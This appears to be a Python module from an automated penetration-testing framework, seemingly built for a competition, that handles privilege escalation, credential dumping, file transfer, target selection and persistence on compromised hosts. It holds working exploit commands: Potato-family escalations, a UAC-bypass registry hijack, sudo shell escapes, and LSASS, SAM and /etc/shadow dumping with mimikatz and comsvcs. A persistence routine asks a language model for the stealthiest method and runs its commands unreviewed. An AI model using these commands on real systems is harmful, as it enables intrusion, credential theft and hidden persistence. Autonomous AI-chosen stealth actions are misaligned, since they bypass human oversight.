# internal_network/advanced_operations.py
"""
高级渗透操作模块

处理复杂渗透场景:
- 权限提升 (Privilege Escalation)
- 远程桌面登录 (RDP/WinRM)
- 远程文件传输 (File Transfer)
- 凭据转储 (Credential Dumping)
- 持久化 (Persistence)
- 域渗透 (Domain Penetration)

设计原则:
1. 每个操作都有完整的错误处理和回滚机制
2. 支持多种执行方式（工具失败自动切换备用方案）
3. 详细的日志记录供审计
"""

import os
import time
import json
import re
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from enum import Enum
from tool_framework import ToolRegistry


class OperationStatus(Enum):
    """操作状态"""
    SUCCESS = "success"
    FAILED = "failed"
    PARTIAL = "partial"
    TIMEOUT = "timeout"
    NEED_CREDENTIALS = "need_credentials"
    NEED_PRIVILEGE = "need_privilege"


@dataclass
class OperationResult:
    """操作结果"""
    status: OperationStatus
    message: str
    data: Dict[str, Any]
    next_steps: List[str]
    rollback_cmd: Optional[str] = None


class PrivilegeEscalation:
    """
    权限提升处理器

    支持场景:
    - Windows: Potato系列、服务配置错误、UAC绕过
    - Linux: 内核漏洞、SUID、Sudo配置错误
    """

    # Windows提权方法（按优先级排序）
    WINDOWS_METHODS = [
        {
            "name": "PrintSpoofer",
            "check": "whoami /priv",
            "exploit": "PrintSpoofer.exe -i -c cmd",
            "requirement": "SeImpersonatePrivilege",
            "confidence": 0.9
        },
        {
            "name": "JuicyPotato",
            "check": "whoami /priv",
            "exploit": "JuicyPotato.exe -t * -p cmd.exe -l 1337",
            "requirement": "SeImpersonatePrivilege",
            "confidence": 0.85
        },
        {
            "name": "RoguePotato",
            "check": "whoami /priv",
            "exploit": "RoguePotato.exe -r {lhost} -l 9999 -e cmd.exe",
            "requirement": "SeImpersonatePrivilege",
            "confidence": 0.8
        },
        {
            "name": "GodPotato",
            "check": "whoami /priv",
            "exploit": "GodPotato.exe -cmd \"cmd -c whoami\"",
            "requirement": "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege",
            "confidence": 0.85
        },
        {
            "name": "ServiceConfig",
            "check": "sc query",
            "exploit": "sc config {service} binPath= \"cmd /c {command}\"",
            "requirement": "Service modification rights",
            "confidence": 0.7
        },
        {
            "name": "UAC_Bypass",
            "check": "whoami /groups",
            "exploit": "cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d \"{command}\" /f && computerdefaults.exe",
            "requirement": "Medium integrity",
            "confidence": 0.6
        }
    ]

    # Linux提权方法
    LINUX_METHODS = [
        {
            "name": "KernelExploit",
            "check": "uname -a",
            "exploit": "Search for kernel exploits based on version",
            "confidence": 0.7
        },
        {
            "name": "SUID",
            "check": "find / -perm -4000 -type f 2>/dev/null",
            "exploit": "Execute SUID binaries",
            "confidence": 0.8
        },
        {
            "name": "Sudo",
            "check": "sudo -l",
            "exploit": "Abuse sudo misconfigurations",
            "confidence": 0.85
        },
        {
            "name": "SudoMySQL",
            "check": "sudo -l | grep mysql",
            "exploit": "sudo mysql -e '\\! /bin/sh'  OR  sudo mysql -e '\\! cat /root/flag*'",
            "confidence": 0.95
        },
        {
            "name": "SudoVim",
            "check": "sudo -l | grep vim",
            "exploit": "sudo vim -c ':!/bin/sh'",
            "confidence": 0.95
        },
        {
            "name": "SudoLess",
            "check": "sudo -l | grep less",
            "exploit": "sudo less /etc/passwd\\n!/bin/sh",
            "confidence": 0.95
        },
        {
            "name": "SudoNmap",
            "check": "sudo -l | grep nmap",
            "exploit": "sudo nmap --interactive\\n!sh",
            "confidence": 0.95
        },
        {
            "name": "SudoFind",
            "check": "sudo -l | grep find",
            "exploit": "sudo find / -exec /bin/sh \\;",
            "confidence": 0.95
        },
        {
            "name": "SudoPython",
            "check": "sudo -l | grep python",
            "exploit": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
            "confidence": 0.95
        },
        {
            "name": "SudoPerl",
            "check": "sudo -l | grep perl",
            "exploit": "sudo perl -e 'exec \"/bin/sh\";'",
            "confidence": 0.95
        },
        {
            "name": "SudoBash",
            "check": "sudo -l | grep -E 'bash|sh'",
            "exploit": "sudo -u root /bin/bash",
            "confidence": 0.95
        },
        {
            "name": "Cron",
            "check": "cat /etc/crontab; ls -la /etc/cron*",
            "exploit": "Writable cron scripts",
            "confidence": 0.75
        },
        {
            "name": "Capabilities",
            "check": "getcap -r / 2>/dev/null",
            "exploit": "Abuse file capabilities",
            "confidence": 0.8
        },
        {
            "name": "Docker",
            "check": "id | grep docker; ls /var/run/docker.sock",
            "exploit": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
            "confidence": 0.9
        },
        {
            "name": "LXC/LXD",
            "check": "id | grep lxd; lxc list",
            "exploit": "lxc exec privileged-container -- /bin/sh",
            "confidence": 0.9
        }
    ]

    @classmethod
    def check_privileges(cls, session: Dict) -> Dict:
        """检查当前权限"""
        host = session.get("host")
        shell_type = session.get("shell_type")

        # 执行权限检查命令
        if session.get("os", "").lower() == "windows":
            commands = {
                "whoami": "whoami",
                "privileges": "whoami /priv",
                "groups": "whoami /groups",
                "system_check": "net session 2>&1"
            }
        else:
            commands = {
                "whoami": "id",
                "sudo_check": "sudo -l 2>/dev/null",
                "suid_check": "find / -perm -4000 -type f 2>/dev/null | head -20"
            }

        results = {}
        for name, cmd in commands.items():
            result = cls._execute_command(session, cmd)
            results[name] = result

        # 分析结果
        analysis = cls._analyze_privileges(results, session.get("os", "linux"))

        return {
            "current_user": results.get("whoami", {}).get("output", ""),
            "is_admin": analysis.get("is_admin", False),
            "is_system": analysis.get("is_system", False),
            "available_methods": analysis.get("methods", []),
            "raw_results": results
        }

    @classmethod
    def attempt_escalation(cls, session: Dict, method: str) -> OperationResult:
        """尝试权限提升"""
        os_type = session.get("os", "linux").lower()
        methods = cls.WINDOWS_METHODS if os_type == "windows" else cls.LINUX_METHODS

        # 找到指定方法
        method_config = next((m for m in methods if m["name"] == method), None)
        if not method_config:
            return OperationResult(
                status=OperationStatus.FAILED,
                message=f"Unknown escalation method: {method}",
                data={},
                next_steps=["Check available methods with check_privileges"]
            )

        # 执行提权
        exploit_cmd = method_config["exploit"]
        result = cls._execute_command(session, exploit_cmd)

        if result.get("success"):
            return OperationResult(
                status=OperationStatus.SUCCESS,
                message=f"Privilege escalation successful using {method}",
                data={"new_shell": result.get("output", "")},
                next_steps=["Verify new privileges", "Dump credentials"]
            )
        else:
            return OperationResult(
                status=OperationStatus.FAILED,
                message=f"Escalation failed: {result.get('error', 'Unknown error')}",
                data=result,
                next_steps=["Try alternative method", "Check prerequisites"]
            )

    @classmethod
    def _execute_command(cls, session: Dict, command: str) -> Dict:
        """通过会话执行命令"""
        host = session.get("host")
        shell_type = session.get("shell_type")

        if shell_type == "meterpreter":
            # 通过Metasploit执行
            result = ToolRegistry.execute_cached(
                "metasploit",
                host,
                {"action": "execute", "command": command}
            )
        elif shell_type in ["shell", "ssh"]:
            # 通过SSH执行
            result = ToolRegistry.execute_cached(
                "impacket",
                host,
                {"script": "wmiexec", "command": command}
            )
        else:
            # 尝试通过impacket
            result = ToolRegistry.execute_cached(
                "impacket",
                host,
                {"script": "psexec", "command": command}
            )

        return result.get("result", {})

    @classmethod
    def _analyze_privileges(cls, results: Dict, os_type: str) -> Dict:
        """分析权限状态"""
        analysis = {
            "is_admin": False,
            "is_system": False,
            "methods": []
        }

        if os_type == "windows":
            priv_output = results.get("privileges", {}).get("output", "")
            whoami_output = results.get("whoami", {}).get("output", "")

            # 检查是否是SYSTEM
            if "NT AUTHORITY\\SYSTEM" in whoami_output:
                analysis["is_system"] = True
                analysis["is_admin"] = True

            # 检查是否是管理员
            if "Administrators" in whoami_output:
                analysis["is_admin"] = True

            # 检查可用提权方法
            if "SeImpersonatePrivilege" in priv_output:
                for method in cls.WINDOWS_METHODS:
                    if method["requirement"] == "SeImpersonatePrivilege":
                        analysis["methods"].append({
                            "name": method["name"],
                            "confidence": method["confidence"]
                        })

            if "Medium integrity" in results.get("groups", {}).get("output", ""):
                analysis["methods"].append({
                    "name": "UAC_Bypass",
                    "confidence": 0.6
                })

        else:  # Linux
            id_output = results.get("whoami", {}).get("output", "")
            sudo_output = results.get("sudo_check", {}).get("output", "")
            suid_output = results.get("suid_check", {}).get("output", "")

            if "uid=0" in id_output:
                analysis["is_admin"] = True
                analysis["is_system"] = True

            # 检查Sudo配置 - 检测特定提权路径
            if sudo_output:
                sudo_lower = sudo_output.lower()

                # 检测常见的sudo提权命令
                sudo_escapes = {
                    "mysql": "SudoMySQL",
                    "vim": "SudoVim",
                    "vi": "SudoVim",
                    "less": "SudoLess",
                    "more": "SudoLess",
                    "nmap": "SudoNmap",
                    "find": "SudoFind",
                    "python": "SudoPython",
                    "python3": "SudoPython",
                    "perl": "SudoPerl",
                    "bash": "SudoBash",
                    "sh": "SudoBash",
                    "zsh": "SudoBash",
                    "docker": "Docker",
                }

                for cmd, method_name in sudo_escapes.items():
                    if cmd in sudo_lower and ("(root)" in sudo_output or "nopasswd" in sudo_lower):
                        analysis["methods"].append({
                            "name": method_name,
                            "confidence": 0.95,
                            "command": cmd
                        })

                # 如果有任意sudo权限但没匹配到特定命令
                if "(root)" in sudo_output and not analysis["methods"]:
                    analysis["methods"].append({
                        "name": "Sudo",
                        "confidence": 0.85
                    })

            # 检查SUID
            if suid_output and len(suid_output.strip()) > 0:
                analysis["methods"].append({
                    "name": "SUID",
                    "confidence": 0.8
                })

        return analysis


class RemoteDesktopHandler:
    """
    远程桌面处理器

    支持:
    - RDP (Windows)
    - WinRM (Windows)
    - VNC (Cross-platform)
    - SSH X11 Forwarding (Linux)
    """

    @classmethod
    def connect_rdp(cls, target: str, credentials: Dict) -> OperationResult:
        """连接RDP"""
        username = credentials.get("username")
        password = credentials.get("password")
        domain = credentials.get("domain", "")

        # 使用xfreerdp或rdesktop
        cmd = f"xfreerdp /u:{username} /p:{password} /v:{target}"
        if domain:
            cmd += f" /d:{domain}"

        # 实际连接需要交互式环境，这里只是准备连接
        return OperationResult(
            status=OperationStatus.SUCCESS,
            message="RDP connection parameters prepared",
            data={
                "command": cmd,
                "target": target,
                "username": username
            },
            next_steps=["Execute connection in interactive session"]
        )

    @classmethod
    def connect_winrm(cls, target: str, credentials: Dict) -> OperationResult:
        """通过WinRM连接"""
        username = credentials.get("username")
        password = credentials.get("password")
        domain = credentials.get("domain", "")

        # 使用evil-winrm
        result = ToolRegistry.execute_cached(
            "impacket",  # 或专门的evil-winrm
            target,
            {
                "script": "wmiexec",
                "target": target,
                "username": username,
                "password": password,
                "domain": domain
            }
        )

        if result.get("result", {}).get("success"):
            return OperationResult(
                status=OperationStatus.SUCCESS,
                message="WinRM session established",
                data={"session": result.get("result", {})},
                next_steps=["Execute commands", "Transfer files"]
            )
        else:
            return OperationResult(
                status=OperationStatus.FAILED,
                message="WinRM connection failed",
                data=result,
                next_steps=["Check WinRM service", "Verify credentials"]
            )


class FileTransferHandler:
    """
    文件传输处理器

    支持:
    - SMB上传/下载
    - HTTP上传/下载
    - FTP传输
    - Base64编码传输（适用于受限环境）
    """

    @classmethod
    def upload_file(cls, local_path: str, remote_path: str,
                    session: Dict, method: str = "smb") -> OperationResult:
        """上传文件到目标"""

        if not os.path.exists(local_path):
            return OperationResult(
                status=OperationStatus.FAILED,
                message=f"Local file not found: {local_path}",
                data={},
                next_steps=["Check file path"]
            )

        host = session.get("host")
        credentials = session.get("credentials", {})

        if method == "smb":
            return cls._upload_via_smb(local_path, remote_path, host, credentials)
        elif method == "http":
            return cls._upload_via_http(local_path, remote_path, host)
        elif method == "base64":
            return cls._upload_via_base64(local_path, remote_path, session)
        else:
            return OperationResult(
                status=OperationStatus.FAILED,
                message=f"Unknown upload method: {method}",
                data={},
                next_steps=["Use smb, http, or base64"]
            )

    @classmethod
    def download_file(cls, remote_path: str, local_path: str,
                      session: Dict, method: str = "smb") -> OperationResult:
        """从目标下载文件"""
        host = session.get("host")
        credentials = session.get("credentials", {})

        if method == "smb":
            return cls._download_via_smb(remote_path, local_path, host, credentials)
        elif method == "http":
            return cls._download_via_http(remote_path, local_path, host)
        elif method == "base64":
            return cls._download_via_base64(remote_path, local_path, session)
        else:
            return OperationResult(
                status=OperationStatus.FAILED,
                message=f"Unknown download method: {method}",
                data={},
                next_steps=["Use smb, http, or base64"]
            )

    @classmethod
    def _upload_via_smb(cls, local_path: str, remote_path: str,
                        host: str, credentials: Dict) -> OperationResult:
        """通过SMB上传"""
        result = ToolRegistry.execute_cached(
            "impacket",
            host,
            {
                "script": "smbclient",
                "target": host,
                "username": credentials.get("username"),
                "password": credentials.get("password"),
                "domain": credentials.get("domain", ""),
                "command": f"put {local_path} {remote_path}"
            }
        )

        if result.get("result", {}).get("success"):
            return OperationResult(
                status=OperationStatus.SUCCESS,
                message=f"File uploaded via SMB: {local_path} -> {remote_path}",
                data=result.get("result", {}),
                next_steps=["Verify upload", "Execute file"]
            )
        return OperationResult(
            status=OperationStatus.FAILED,
            message="SMB upload failed",
            data=result,
            next_steps=["Check SMB share permissions", "Try alternative method"]
        )

    @classmethod
    def _upload_via_base64(cls, local_path: str, remote_path: str,
                           session: Dict) -> OperationResult:
        """通过Base64编码上传（适用于受限环境）"""
        try:
            with open(local_path, "rb") as f:
                content = f.read()

            # 分块编码（避免命令行长度限制）
            import base64
            encoded = base64.b64encode(content).decode()
            chunk_size = 8000
            chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]

            commands = []
            for i, chunk in enumerate(chunks):
                if i == 0:
                    cmd = f'echo "{chunk}" > {remote_path}.b64'
                else:
                    cmd = f'echo "{chunk}" >> {remote_path}.b64'
                commands.append(cmd)

            # 解码命令
            decode_cmd = f"base64 -d {remote_path}.b64 > {remote_path}"
            commands.append(decode_cmd)
            commands.append(f"rm {remote_path}.b64")

            return OperationResult(
                status=OperationStatus.SUCCESS,
                message="Base64 upload commands prepared",
                data={"commands": commands, "chunks": len(chunks)},
                next_steps=["Execute commands in sequence"]
            )
        except Exception as e:
            return OperationResult(
                status=OperationStatus.FAILED,
                message=f"Base64 encoding failed: {str(e)}",
                data={},
                next_steps=["Check file size", "Try alternative method"]
            )

    @classmethod
    def _download_via_smb(cls, remote_path: str, local_path: str,
                          host: str, credentials: Dict) -> OperationResult:
        """通过SMB下载"""
        result = ToolRegistry.execute_cached(
            "impacket",
            host,
            {
                "script": "smbclient",
                "target": host,
                "username": credentials.get("username"),
                "password": credentials.get("password"),
                "command": f"get {remote_path} {local_path}"
            }
        )

        if result.get("result", {}).get("success"):
            return OperationResult(
                status=OperationStatus.SUCCESS,
                message=f"File downloaded: {remote_path} -> {local_path}",
                data={"local_path": local_path},
                next_steps=["Analyze file contents"]
            )
        return OperationResult(
            status=OperationStatus.FAILED,
            message="SMB download failed",
            data=result,
            next_steps=["Check file permissions", "Try alternative path"]
        )

    @classmethod
    def _upload_via_http(cls, local_path: str, remote_path: str,
                         host: str) -> OperationResult:
        """预留HTTP上传接口"""
        return OperationResult(
            status=OperationStatus.NEED_CREDENTIALS,
            message="HTTP upload requires web server setup",
            data={},
            next_steps=["Setup HTTP server", "Use alternative method"]
        )

    @classmethod
    def _download_via_http(cls, remote_path: str, local_path: str,
                           host: str) -> OperationResult:
        """预留HTTP下载接口"""
        return OperationResult(
            status=OperationStatus.NEED_CREDENTIALS,
            message="HTTP download requires accessible web server",
            data={},
            next_steps=["Check for web server", "Use alternative method"]
        )

    @classmethod
    def _download_via_base64(cls, remote_path: str, local_path: str,
                             session: Dict) -> OperationResult:
        """通过Base64下载"""
        # 执行base64编码命令
        result = PrivilegeEscalation._execute_command(
            session, f"base64 {remote_path}"
        )

        if result.get("success"):
            try:
                import base64
                encoded = result.get("output", "")
                content = base64.b64decode(encoded)

                with open(local_path, "wb") as f:
                    f.write(content)

                return OperationResult(
                    status=OperationStatus.SUCCESS,
                    message=f"File downloaded via base64: {remote_path}",
                    data={"local_path": local_path, "size": len(content)},
                    next_steps=["Analyze file contents"]
                )
            except Exception as e:
                return OperationResult(
                    status=OperationStatus.FAILED,
                    message=f"Base64 decode failed: {str(e)}",
                    data=result,
                    next_steps=["Check encoding", "Try alternative method"]
                )

        return OperationResult(
            status=OperationStatus.FAILED,
            message="Base64 encoding command failed",
            data=result,
            next_steps=["Check file existence", "Verify permissions"]
        )


class CredentialDumper:
    """
    凭据转储处理器

    支持:
    - LSASS dump (Windows)
    - SAM/SYSTEM dump (Windows)
    - Mimikatz (Windows)
    - /etc/shadow (Linux)
    - Browser credentials
    - SSH keys
    """

    @classmethod
    def dump_lsass(cls, session: Dict) -> OperationResult:
        """转储LSASS内存"""
        if session.get("os", "").lower() != "windows":
            return OperationResult(
                status=OperationStatus.FAILED,
                message="LSASS dump only works on Windows",
                data={},
                next_steps=["Use appropriate method for Linux"]
            )

        # 检查权限
        priv_check = PrivilegeEscalation.check_privileges(session)
        if not priv_check.get("is_admin"):
            return OperationResult(
                status=OperationStatus.NEED_PRIVILEGE,
                message="LSASS dump requires admin privileges",
                data=priv_check,
                next_steps=["Attempt privilege escalation first"]
            )

        # 尝试多种方法
        methods = [
            ("procdump", "procdump.exe -accepteula -ma lsass.exe lsass.dmp"),
            ("rundll32", "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\temp\\lsass.dmp full"),
            ("mimikatz", "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"")
        ]

        results = []
        for method_name, cmd in methods:
            result = PrivilegeEscalation._execute_command(session, cmd)
            results.append({
                "method": method_name,
                "success": result.get("success", False),
                "output": result.get("output", "")[:500]  # 截断输出
            })
            if result.get("success"):
                break

        successful = [r for r in results if r["success"]]
        if successful:
            return OperationResult(
                status=OperationStatus.SUCCESS,
                message="LSASS dump successful",
                data={"method": successful[0]["method"], "results": results},
                next_steps=["Parse credentials", "Use for lateral movement"]
            )

        return OperationResult(
            status=OperationStatus.FAILED,
            message="All LSASS dump methods failed",
            data={"attempts": results},
            next_steps=["Check AV/EDR", "Try alternative timing"]
        )

    @classmethod
    def dump_sam_system(cls, session: Dict) -> OperationResult:
        """转储SAM和SYSTEM"""
        # 检查权限
        priv_check = PrivilegeEscalation.check_privileges(session)
        if not priv_check.get("is_admin"):
            return OperationResult(
                status=OperationStatus.NEED_PRIVILEGE,
                message="SAM dump requires admin privileges",
                data=priv_check,
                next_steps=["Attempt privilege escalation first"]
            )

        # 使用reg save
        commands = [
            "reg save HKLM\\SAM C:\\temp\\sam.bak",
            "reg save HKLM\\SYSTEM C:\\temp\\system.bak"
        ]

        results = {}
        for cmd in commands:
            result = PrivilegeEscalation._execute_command(session, cmd)
            results[cmd] = result

        if all(r.get("success") for r in results.values()):
            return OperationResult(
                status=OperationStatus.SUCCESS,
                message="SAM and SYSTEM dumped successfully",
                data={"files": ["C:\\temp\\sam.bak", "C:\\temp\\system.bak"]},
                next_steps=["Download files", "Parse offline with secretsdump"]
            )

        return OperationResult(
            status=OperationStatus.PARTIAL,
            message="Partial SAM dump success",
            data=results,
            next_steps=["Check specific errors", "Try alternative paths"]
        )

    @classmethod
    def dump_linux_hashes(cls, session: Dict) -> OperationResult:
        """转储Linux密码哈希"""
        if session.get("os", "").lower() == "windows":
            return OperationResult(
                status=OperationStatus.FAILED,
                message="This method is for Linux only",
                data={},
                next_steps=["Use LSASS or SAM dump for Windows"]
            )

        # 检查是否是root
        priv_check = PrivilegeEscalation.check_privileges(session)
        if not priv_check.get("is_admin"):
            return OperationResult(
                status=OperationStatus.NEED_PRIVILEGE,
                message="/etc/shadow requires root access",
                data=priv_check,
                next_steps=["Attempt privilege escalation first"]
            )

        result = PrivilegeEscalation._execute_command(session, "cat /etc/shadow")

        if result.get("success"):
            hashes = []
            for line in result.get("output", "").split("\n"):
                if ":" in line and "$" in line:
                    parts = line.split(":")
                    if len(parts) >= 2:
                        hashes.append({
                            "username": parts[0],
                            "hash": parts[1],
                            "type": cls._identify_hash_type(parts[1])
                        })

            return OperationResult(
                status=OperationStatus.SUCCESS,
                message=f"Found {len(hashes)} password hashes",
                data={"hashes": hashes},
                next_steps=["Crack hashes", "Use for lateral movement"]
            )

        return OperationResult(
            status=OperationStatus.FAILED,
            message="Failed to read /etc/shadow",
            data=result,
            next_steps=["Verify root access", "Check file permissions"]
        )

    @staticmethod
    def _identify_hash_type(hash_string: str) -> str:
        """识别哈希类型"""
        if hash_string.startswith("$6$"):
            return "SHA-512"
        elif hash_string.startswith("$5$"):
            return "SHA-256"
        elif hash_string.startswith("$1$"):
            return "MD5"
        elif hash_string.startswith("$2y$") or hash_string.startswith("$2a$"):
            return "bcrypt"
        elif hash_string.startswith("___"):
            return "DES"
        else:
            return "unknown"


class IntelligentPathSelector:
    """
    智能路径选择器

    根据当前状态和发现的信息，自动选择最优攻击路径
    """

    @classmethod
    def select_next_target(cls, state: Dict) -> Dict:
        """
        选择下一个攻击目标

        考虑因素:
        1. 目标价值（域控、数据库服务器等）
        2. 可达性（有凭据、有路径）
        3. 成功概率（基于历史攻击结果）
        4. 资源消耗（时间、工具可用性）
        """
        internal_hosts = state.get("internal_hosts", [])
        credentials = state.get("credentials", [])
        active_sessions = state.get("active_sessions", [])
        attack_history = state.get("attack_results", [])

        # 已攻陷的主机
        compromised = [s.get("host") for s in active_sessions]

        # 评分每个未攻陷主机
        candidates = []
        for host in internal_hosts:
            ip = host.get("ip", "")
            if ip in compromised:
                continue

            score = cls._calculate_target_score(host, credentials, attack_history)
            candidates.append({
                "ip": ip,
                "score": score,
                "reason": score["reason"],
                "recommended_method": score["method"]
            })

        # 按分数排序
        candidates.sort(key=lambda x: x["score"]["total"], reverse=True)

        return {
            "recommended_target": candidates[0] if candidates else None,
            "all_candidates": candidates[:5],
            "reasoning": cls._explain_selection(candidates)
        }

    @classmethod
    def _calculate_target_score(cls, host: Dict, credentials: List,
                                history: List) -> Dict:
        """计算目标评分"""
        score = {
            "total": 0,
            "value": 0,
            "accessibility": 0,
            "success_probability": 0,
            "reason": "",
            "method": ""
        }

        ports = host.get("ports", [])
        port_numbers = [p.get("port") for p in ports]

        # 价值评分
        if any(p in port_numbers for p in [88, 389, 636, 3268]):
            score["value"] = 100  # 域控
            score["reason"] = "Domain Controller"
            score["method"] = "Kerberos attack"
        elif any(p in port_numbers for p in [1433, 3306, 5432]):
            score["value"] = 80  # 数据库
            score["reason"] = "Database server"
            score["method"] = "Database attack"
        elif any(p in port_numbers for p in [445, 139]):
            score["value"] = 60  # 文件服务器
            score["reason"] = "SMB accessible"
            score["method"] = "SMB exploitation"
        elif 3389 in port_numbers:
            score["value"] = 50  # RDP
            score["reason"] = "RDP available"
            score["method"] = "RDP login"
        elif 22 in port_numbers:
            score["value"] = 40  # SSH
            score["reason"] = "SSH available"
            score["method"] = "SSH brute force"
        else:
            score["value"] = 20
            score["reason"] = "Generic target"
            score["method"] = "Service enumeration"

        # 可达性评分
        if credentials:
            score["accessibility"] = 50

        # 成功概率（基于历史）
        if history:
            recent_success = sum(1 for h in history[-10:] if h.get("is_exploit"))
            score["success_probability"] = recent_success * 5

        # 总分
        score["total"] = score["value"] + score["accessibility"] + score["success_probability"]

        return score

    @classmethod
    def _explain_selection(cls, candidates: List) -> str:
        """解释选择原因"""
        if not candidates:
            return "No targets available"

        best = candidates[0]
        return f"Selected {best['ip']} ({best['reason']}) with score {best['score']['total']}"


class PersistenceHandler:
    """
    AI驱动的持久化处理器

    设计原则:
    - 让AI分析环境并决定最佳策略
    - 不预定义方法列表，避免硬编码规则
    - 简洁有效，代码清晰

    比赛关键: 第三赛区多层网络需要权限维持
    """

    @classmethod
    def establish_persistence(cls, session: Dict) -> OperationResult:
        """
        AI驱动建立持久化访问

        流程:
        1. 收集环境信息
        2. AI分析并决定策略
        3. 执行AI建议的命令
        4. 验证持久化有效
        """
        # Step 1: 收集环境信息
        env_info = cls._collect_env_info(session)
        os_type = session.get("os_type", "linux").lower()

        # Step 2: AI分析并决定策略
        ai_decision = cls._ai_decide_persistence(os_type, env_info)

        if not ai_decision.get("commands"):
            return OperationResult(
                status=OperationStatus.FAILED,
                message="AI未能生成有效的持久化命令",
                data={"ai_response": ai_decision},
                next_steps=["检查环境信息", "尝试手动持久化"]
            )

        # Step 3: 执行AI建议的命令
        results = []
        for cmd in ai_decision["commands"]:
            result = PrivilegeEscalation._execute_command(session, cmd)
            results.append({
                "command": cmd,
                "success": result.get("success", False),
                "output": result.get("output", "")[:200]
            })

        # Step 4: 验证持久化有效
        successful = [r for r in results if r["success"]]
        if successful:
            return OperationResult(
                status=OperationStatus.SUCCESS,
                message=f"持久化建立成功: {ai_decision.get('method', 'unknown')}",
                data={
                    "method": ai_decision.get("method"),
                    "results": results,
                    "cleanup_commands": ai_decision.get("cleanup_commands", [])
                },
                next_steps=["验证持久化", "继续操作"],
                rollback_cmd=ai_decision.get("cleanup_commands", [None])[0]
            )

        return OperationResult(
            status=OperationStatus.FAILED,
            message="所有持久化命令执行失败",
            data={"attempts": results, "ai_decision": ai_decision},
            next_steps=["检查权限", "尝试其他方法"]
        )

    @classmethod
    def _collect_env_info(cls, session: Dict) -> Dict:
        """收集环境信息供AI分析"""
        os_type = session.get("os_type", "linux").lower()

        # 执行环境探测命令
        if os_type == "windows":
            commands = {
                "whoami": "whoami",
                "privileges": "whoami /priv 2>&1",
                "admin_check": "net session 2>&1 || echo NOT_ADMIN"
            }
        else:
            commands = {
                "whoami": "id",
                "crontab": "crontab -l 2>&1 || echo NO_CRONTAB",
                "writable_dirs": "ls -la /tmp ~/. 2>/dev/null | head -10"
            }

        results = {}
        for name, cmd in commands.items():
            result = PrivilegeEscalation._execute_command(session, cmd)
            results[name] = result.get("output", "")[:500]

        return results

    @classmethod
    def _ai_decide_persistence(cls, os_type: str, env_info: Dict) -> Dict:
        """
        AI决策持久化策略

        让AI根据环境信息自主选择最佳方法
        """
        try:
            from llm_client import llm_client
            from config import config

            prompt = f"""你是渗透测试专家。根据目标环境，选择最佳的持久化方法并生成命令。

目标系统: {os_type}
环境信息:
{json.dumps(env_info, ensure_ascii=False, indent=2)}

要求:
1. 选择最隐蔽且可行的持久化方法
2. 生成具体的执行命令
3. 同时生成清理命令

输出JSON格式:
{{
    "method": "方法名称",
    "reason": "选择理由",
    "commands": ["要执行的命令列表"],
    "cleanup_commands": ["清理命令列表"],
    "stealth_level": 1-5
}}

{"Windows常见方法: 计划任务、注册表Run、服务、WMI事件" if os_type == "windows" else "Linux常见方法: crontab、systemd、bashrc、SSH密钥"}

选择权限允许的最隐蔽方法。"""

            response = llm_client.call_chat_completion(
                model=config.HAIKU_MODEL,
                messages=[{"role": "user", "content": prompt}],
                json_mode=True,
                timeout=30
            )

            if response:
                return json.loads(response)

        except Exception as e:
            pass

        # 降级策略：简单的默认命令
        if os_type == "windows":
            return {
                "method": "registry_run",
                "reason": "fallback: 最低权限要求",
                "commands": ['reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "UpdateService" /t REG_SZ /d "cmd /c whoami" /f'],
                "cleanup_commands": ['reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "UpdateService" /f']
            }
        else:
            return {
                "method": "bashrc",
                "reason": "fallback: 用户级持久化",
                "commands": ["echo '# Update check\\nwhoami' >> ~/.bashrc"],
                "cleanup_commands": ["sed -i '/Update check/d' ~/.bashrc"]
            }

    @classmethod
    def verify_persistence(cls, session: Dict, method: str = None) -> bool:
        """验证持久化是否有效 - AI驱动"""
        env_info = cls._collect_env_info(session)

        # 简单验证：检查环境变化
        if method == "registry_run":
            result = PrivilegeEscalation._execute_command(
                session, 'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"'
            )
            return "UpdateService" in result.get("output", "")
        elif method == "bashrc":
            result = PrivilegeEscalation._execute_command(session, "cat ~/.bashrc | grep -c Update")
            return "1" in result.get("output", "0")

        return False